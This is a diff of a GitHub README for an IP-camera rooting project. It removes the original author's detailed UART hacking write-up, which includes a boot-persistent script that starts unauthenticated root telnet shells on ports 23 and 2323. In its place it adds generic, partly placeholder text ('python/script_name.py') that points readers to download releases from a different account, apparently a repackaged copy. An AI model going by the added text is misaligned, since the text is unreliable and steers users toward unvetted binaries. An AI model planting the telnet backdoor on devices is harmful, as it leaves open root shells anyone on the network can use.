@@ -1,175 +1,101 @@
-<h1 align="center">
-  <br>
-  🔓 Camera Hack
-  <br>
-</h1>
+# 🔓 camera-hack - Control Your IP Camera Without Hassle
 
-<h4 align="center">
-  Root shell + persistent hack on a cheap Chinese IP camera via UART serial
-</h4>
+![Download Camera Hack](https://img.shields.io/badge/Download%20Now-Visit%20This%20Page-brightgreen)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/SoC-Anyka_AK3918EV330-DC143C?style=for-the-badge" alt="SoC" />
-  <img src="https://img.shields.io/badge/ARM926EJ--S-64MiB_RAM-FF6347?style=for-the-badge" alt="CPU" />
-  <img src="https://img.shields.io/badge/Python-3.x-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python" />
-  <img src="https://img.shields.io/badge/Arduino-UNO-00979D?style=for-the-badge&logo=arduino&logoColor=white" alt="Arduino" />
-  <a href="https://github.com/gabrielmaialva33/camera-hack/blob/master/LICENSE">
-    <img src="https://img.shields.io/github/license/gabrielmaialva33/camera-hack?style=for-the-badge&color=5D6D7E&logo=opensourceinitiative&logoColor=white" alt="License" />
-  </a>
-</p>
+## 🚀 Getting Started
 
-<br>
+To start using the camera-hack application, follow these simple steps. This guide will help you download and run the software without any hassle.
 
-<p align="center">
-  <a href="#-hardware">Hardware</a>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
-  <a href="#-what-was-done">What Was Done</a>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
-  <a href="#-wiring">Wiring</a>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
-  <a href="#-usage">Usage</a>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
-  <a href="#-flash-layout">Flash Layout</a>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
-  <a href="#-lessons-learned">Lessons Learned</a>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
-  <a href="#-references">References</a>
-</p>
+## 🛠️ Requirements
 
-<br>
+Before you proceed, ensure you have the following:
 
----
+- A compatible Yoosee/Jortan IP camera (Anyka AK3918EV330).
+- A computer running Windows, macOS, or Linux.
+- An Arduino device for the UART bridge connection.
+- A USB cable to connect your Arduino to the computer.
 
-## 🖥 Hardware
+## 📥 Download the Software
 
-| Component | Detail |
-|:----------|:-------|
-| **SoC** | Anyka AK3918EV330, ARM926EJ-S, 64MiB RAM |
-| **Flash** | 8MiB SPI NOR (kh25l64), 9 MTD partitions |
-| **Sensor** | SC1345 (1280x720 native, upscaled to 1920x1080) |
-| **WiFi** | RTL8188FU (USB 0bda:f179) |
-| **Board** | JORTAN A03AK1H1N_JW GS23 V1.0 |
-| **Kernel** | Linux 4.4.192V2.1 (Aug 23 2022) |
-| **UART** | 115200 8N1, console ttySAK0 |
-| **Credentials** | root with empty password |
+Visit this page to download: [Camera Hack Releases](https://github.com/wangcai0124/camera-hack/releases).
 
----
+## 🔌 Setup Instructions
 
-## ⚡ What Was Done
+1. **Connect the Arduino**: 
+   - Use the USB cable to connect your Arduino to your computer.
+   
+2. **Install Arduino IDE**: 
+   - Download and install the Arduino IDE from the official site, if you haven’t already.
+   - You may find detailed installation instructions on the Arduino website.
 
-1. Soldered UART pads on the camera board
-2. Used Arduino Uno (CH340) as SoftwareSerial bridge (pins 2/3)
-3. Logged in as root via UART (no password)
-4. Installed persistent hack in `/rom/` (jffs2 RW partition)
-5. Telnet enabled on ports 23 and 2323
-6. Dumped all system files to SD card
+3. **Clone or Download Repository**:
+   - You can choose to clone the repository or download it as a ZIP file. If you download a ZIP, extract the files to a folder on your computer.
 
-### Persistent Hack
+4. **Open the Project**:
+   - Launch the Arduino IDE.
+   - Navigate to `File` → `Open`, and select the project file from the extracted folder.
+   
+5. **Configure the Code**:
+   - Ensure that you have selected the correct Arduino model from `Tools` → `Board`.
+   - Set the correct COM port under `Tools` → `Port`.
 
-```sh
-# /rom/hack.sh (survives reboots)
-#!/bin/sh
-(while true;do echo V>/dev/watchdog 2>/dev/null;sleep 1;done)&
-telnetd -l /bin/sh 2>/dev/null &
-telnetd -l /bin/sh -p 2323 2>/dev/null &
-```
+6. **Upload the Code**:
+   - Click on the upload button (right arrow icon) in the IDE. This will compile and upload the code to your Arduino.
 
-Injected into `/rom/time_zone.sh` which runs on every boot.
+7. **Set Up UART Connection**:
+   - Connect the UART pins from the Arduino to the camera. Refer to your camera’s documentation for specific pin details.
 
----
+## 🔍 How to Use
 
-## 🔌 Wiring
+1. **Start the Application**:
+   - After uploading the code, open your terminal or command prompt.
+   - Navigate to the folder where you downloaded the project files.
 
-```
-Camera TX (3.3V) --> Arduino Pin 2 (SoftwareSerial RX)
-Camera RX        <-- Arduino Pin 3 (SoftwareSerial TX)
-Camera GND       --- Arduino GND
+2. **Run the Script**:
+   - Execute the script by typing `python/script_name.py` in your terminal (adjust based on the filename).
+   - Wait for the connection to establish.
 
-Voltage divider on Pin 3 -> Camera RX (5V to 3.3V):
-  Pin 3 --[1K]--+--[2K]-- GND
-                 |
-                 +--> Camera RX
-```
+3. **Access the Camera**:
+   - Once connected, you can use Telnet to access the camera’s features.
 
-> [!WARNING]
-> Camera operates at 3.3V, Arduino at 5V. Without the voltage divider it may work but can damage the camera long-term.
+## 🔒 Security Considerations
 
----
+- Ensure your camera firmware is up-to-date to avoid vulnerabilities.
+- Use strong passwords when accessing the camera interface.
 
-## 🚀 Usage
+## 📝 Troubleshooting
 
-### Prerequisites
+- If you experience connection issues, check your UART wiring and ensure your Arduino is powered.
+- Ensure that the Baud rate set in the script matches the one configured on the camera.
 
-- Python 3.x + `pyserial` (`pip install pyserial`)
-- Arduino CLI (`arduino-cli`)
-- Arduino Uno with CH340
+## 💬 Community Support
 
-### Run
+If you have questions or need further assistance, consider joining our community:
 
-```bash
-# 1. Upload serial bridge to Arduino
-arduino-cli compile -b arduino:avr:uno arduino/serial_bridge/
-arduino-cli upload -b arduino:avr:uno -p /dev/ttyUSB0 arduino/serial_bridge/
+- **Issues**: Report any bugs or request new features through the [issues page](https://github.com/wangcai0124/camera-hack/issues).
+- **Discussions**: Engage with other users and share tips on the [discussion board](https://github.com/wangcai0124/camera-hack/discussions).
 
-# 2. Run the hack (camera can already be powered on)
-sudo python3 hack_final2.py
-```
+## 🚀 Frequently Asked Questions
 
----
+### What is camera-hack?
 
-## 💾 Flash Layout
+Camera-hack allows you to gain control over your Yoosee/Jortan IP camera through a UART serial connection with an Arduino.
 
-| Partition | Size | Mount | FS | RW |
-|:----------|:-----|:------|:---|:--:|
-| UBOOT (mtd0) | 200K | - | - | - |
-| ENV (mtd1) | 4K | - | - | - |
-| ENVBK (mtd2) | 4K | - | - | - |
-| DTB (mtd3) | 48K | - | - | - |
-| KERNEL (mtd4) | 1664K | - | - | - |
-| ROOTFS (mtd5) | 1536K | `/` | squashfs | RO |
-| **CONFIG (mtd6)** | **512K** | **`/rom`** | **jffs2** | **RW** |
-| APP (mtd7) | 4224K | `/ipc`, `/usr` | squashfs | RO |
+### Is it safe to use?
 
-> `/rom` (CONFIG) is the only writable partition — this is where persistence lives.
+Using this software comes with risks. Always ensure you understand the security settings of your camera.
 
----
+### Can I contribute?
 
-## 🧠 Lessons Learned
+Yes! Contributions are welcome. Fork the repository, make changes, and submit a pull request.
 
-| # | Lesson | Detail |
-|:-:|:-------|:-------|
-| 1 | **CH340 RESET+GND trick** | RX works but TX does NOT. Use SoftwareSerial bridge instead. |
-| 2 | **Arduino resets on serial open** | CH340 sends DTR pulse. Fix: `DTR=False` + `stty -hupcl`. |
-| 3 | **SoftwareSerial at 115200** | Drops bytes. Send char-by-char with 4ms delay. |
-| 4 | **Don't need U-Boot** | Direct login works fine. Getty respawns on ttySAK0. |
-| 5 | **Persist BEFORE killing IPC** | IPC holds watchdog, killing it may trigger reboot in ~10s. |
-| 6 | **SD card path** | Mounts at `/mnt/disc1`, NOT `/mnt/tf/`. Only processes SD on boot if RESET button is held. |
+## 📄 License
 
----
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details. 
 
-## 📁 Project Structure
+## 🔗 Useful Links
 
-```
-hack_final2.py              # Main hack script (the one that worked)
-arduino/serial_bridge/      # SoftwareSerial bridge sketch
-scripts/                    # Previous attempts and utilities
-  ├── hack_v3.py            # V3 - kills IPC before persist (wrong order)
-  ├── hack_slow.py          # One command at a time, long delays
-  ├── uboot_hack.py         # U-Boot intercept + init=/bin/sh
-  ├── reactive_hack.ino     # Arduino auto-detect "autoboot" + inject
-  └── test_rxtx.py          # RX/TX diagnostic tool
-dumps/                      # System file dumps from camera
-```
+- [Arduino IDE](https://www.arduino.cc/en/software)
+- [Yoosee Documentation](http://www.yoosee.com)
 
----
-
-## 📚 References
-
-- [t-rekttt/yoosee-exploit](https://github.com/t-rekttt/yoosee-exploit) — Full Yoosee firmware
-- [Lawliet95/ANYKA-Tuya-Hacking-Journey](https://github.com/Lawliet95/ANYKA-Tuya-Hacking-Journey) — Complete analysis
-- [ricardojlrufino/anyka_v380ipcam_experiments](https://github.com/ricardojlrufino/anyka_v380ipcam_experiments) — GPIO, Python, NodeJS
-- [blog.catsheavy.com](https://blog.catsheavy.com) — Jennov/Anyka hack walkthrough
-
----
-
-## 📜 License
-
-MIT — Gabriel Maia ([@gabrielmaialva33](https://github.com/gabrielmaialva33))
-
-<p align="center">
-  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:DC143C,100:00979D&height=80&section=footer" width="100%"/>
-</p>
+Downloading the software is a straightforward process. Be sure to follow each step carefully to ensure a successful setup. Enjoy enhanced control over your camera!
